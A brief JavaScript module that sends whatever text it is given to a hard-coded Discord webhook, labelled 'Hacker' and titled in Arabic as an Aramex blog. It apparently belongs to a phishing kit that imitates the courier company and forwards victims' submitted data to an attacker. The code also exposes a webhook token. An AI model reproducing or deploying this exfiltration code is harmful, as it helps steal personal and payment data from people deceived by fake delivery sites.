import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324334645537411092/UjvXmUEPqW34NQj1dDHzL6SgH7q8Gf1tHchtWv3EDEBmYHUhTI2D56ZxqjUexkQ6aMAq",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
